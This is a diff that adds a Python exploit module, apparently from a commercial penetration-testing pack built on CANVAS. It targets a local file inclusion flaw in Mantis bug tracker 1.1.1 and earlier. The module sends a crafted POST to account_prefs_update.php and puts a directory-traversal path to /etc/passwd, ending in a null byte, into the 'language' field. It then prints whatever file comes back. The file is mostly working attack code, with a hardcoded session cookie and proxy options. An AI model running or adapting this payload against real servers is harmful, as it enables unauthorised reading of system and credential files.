@@ -1,0 +1,148 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, os
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from httplib import HTTPConnection, HTTPSConnection
+
+NAME = "Mantis Local File Include"
+VERSION = "0.1"
+DESCRIPTION = "Mantis 'account_prefs_update.php' Local File Include Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "version 1.1.1 and lower"
+DOCUMENTATION["Date public"] = "2008/06/17"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/30354"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.port = 80 
+		self.page = "/mantis/account_prefs_update.php"
+		self.file = "/../../../../../../etc/passwd"
+		self.userid = "1"
+		self.cookie = "MANTIS_STRING_COOKIE=8a717c1af881ce3bfe8b2edb8ba11c53d73b001b258ef33af67d5a1c649a4e4b"
+		self.https = 0
+		self.useragent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
+		self.website = self.host
+		self.proxy_host = ""
+		self.proxy_port = 0
+		self.name = NAME
+		return
+	
+	def send_request(self):
+		try:
+			if self.proxy_host and self.proxy_port > 0:
+				cnx = HTTPConnection(self.proxy_host, self.proxy_port)
+				if self.https == 0:
+					cnx.putrequest('POST', "http://"+self.host+"/"+self.page)
+				else:
+					cnx.putrequest('POST', "https://"+self.host+"/"+self.page)
+
+			else:
+				if self.https == 0:
+					cnx = HTTPConnection(self.host, self.port)
+				else:
+					cnx = HTTPSConnection(self.host, self.port)
+
+				cnx.putrequest('POST', self.page)
+
+			self.post = "user_id=" + self.userid + "&redirect_url=account_prefs_page.php&default_project=0&refresh_delay=30&redirect_delay=2&bugnote_order=ASC&email_on_new=on&email_on_new_min_severity=0&email_on_assigned=on&email_on_assigned_min_severity=0&email_on_feedback=on&email_on_feedback_min_severity=0&email_on_resolved=on&email_on_resolved_min_severity=0&email_on_closed=on&email_on_closed_min_severity=0&email_on_reopened=on&email_on_reopened_min_severity=0&email_on_bugnote=on&email_on_bugnote_min_severity=0&email_on_status_min_severity=0&email_on_priority_min_severity=0&email_bugnote_limit=0&language=" + self.file + "%00"
+
+			cnx.putheader('Host', self.website)
+			cnx.putheader('Cookie', self.cookie)
+			cnx.putheader('Content-Type', 'application/x-www-form-urlencoded')
+			cnx.putheader('Content-Length', len(self.post))
+			cnx.endheaders()
+			cnx.send(self.post)
+			
+			resp = cnx.getresponse()
+
+			body = resp.read()
+			headers = resp.getheaders()
+
+			try:
+				cnx.close()
+			except Exception:
+				pass
+
+			return (body, headers, resp.status)
+
+		except Exception:
+			try:
+				cnx.close()
+			except Exception:
+				pass
+			self.log("HTTP(S) Transfer error")
+
+			return ("", {}, -1)
+
+	def display_file(self):
+		
+		(body, headers, status) = self.send_request()
+		if "Access Denied" in body:
+			self.log("Access Denied: can't read %s" % self.file)
+			return
+
+		self.log(body)
+		return
+
+	def getargs(self):	
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.file = self.argsDict.get("file",self.file)
+		self.userid = self.argsDict.get("userid",self.userid)
+		self.cookie = self.argsDict.get("cookie",self.cookie)
+		self.https = int(self.argsDict.get("https",self.https))
+		self.website = self.argsDict.get("website",self.website)
+		self.proxy_host = self.argsDict.get("hproxy",self.proxy_host)
+		self.proxy_port = self.argsDict.get("pproxy",self.proxy_port)
+
+	def run(self):
+		self.getargs()
+
+		self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
+		if len(self.file) > 31:
+			self.log("file size is > 31")
+			self.setInfo("%s attacking %s:%d - failed"%(NAME,self.host,self.port))
+			return
+
+		self.display_file()
+
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O file:<path> -O cookie:<value> -O userid:<id> -O https:[0|1] -O hproxy:host -O pproxy:port -O website:<url>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
